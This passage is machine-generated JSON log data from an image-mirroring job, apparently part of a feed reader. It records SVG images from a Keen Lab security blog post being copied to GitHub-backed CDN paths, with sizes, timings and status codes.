KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_2.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn90@2020_4/2020/10/16/17-21-25-445_2167b6571f1903cf.svg","sourceBytes":25029,"destBytes":25029,"feedId":17218,"totalSpendMs":4203,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-034*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.4 KB","destSize":"24.4 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_9.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn54@2020_5/2020/10/16/17-21-25-467_1cc8e1c4e8adc989.svg","sourceBytes":26321,"destBytes":26321,"feedId":17218,"totalSpendMs":4238,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-013*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"25.7 KB","destSize":"25.7 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_10.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn66@2020_3/2020/10/16/17-21-25-594_95d012d3a569d900.svg","sourceBytes":25034,"destBytes":25034,"feedId":17218,"totalSpendMs":4350,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-52*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.4 KB","destSize":"24.4 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_4.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn82@2020_4/2020/10/16/17-21-25-428_770f91441fbc9828.svg","sourceBytes":24239,"destBytes":24239,"feedId":17218,"totalSpendMs":4349,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"europe68*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.7 KB","destSize":"23.7 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_12.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn73@2020_2/2020/10/16/17-21-25-366_7e63c256ceed1b96.svg","sourceBytes":24801,"destBytes":24801,"feedId":17218,"totalSpendMs":4709,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-017*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.2 KB","destSize":"24.2 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_7.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn57@2020_2/2020/10/16/17-21-25-929_3682d1936495cfc0.svg","sourceBytes":24956,"destBytes":24956,"feedId":17218,"totalSpendMs":4732,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-001*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.4 KB","destSize":"24.4 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_6.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn86@2020_1/2020/10/16/17-21-25-487_93846d9d3514533b.svg","sourceBytes":24237,"destBytes":24237,"feedId":17218,"totalSpendMs":4640,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"europe-56*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.7 KB","destSize":"23.7 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_3.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn93@2020_2/2020/10/16/17-21-26-381_a646363345943806.svg","sourceBytes":24792,"destBytes":24792,"feedId":17218,"totalSpendMs":5162,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-021*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.2 KB","destSize":"24.2 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_5.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn77@2020_6/2020/10/16/17-21-26-614_6fcbc080c06b08ee.svg","sourceBytes":24792,"destBytes":24792,"feedId":17218,"totalSpendMs":5367,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-005*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.2 KB","destSize":"24.2 KB","compressRate":"100%"}],"successGithubMap":{"myreaderx25":1,"myreaderx8":1,"myreaderx16":1,"myreaderx10":1,"myreaderx21":1,"myreaderx32":1,"myreaderx11":1,"myreaderx13":1,"myreaderx30":1,"myreaderx31":1,"myreaderx19":1},"failGithubMap":{"myreaderx23":1}}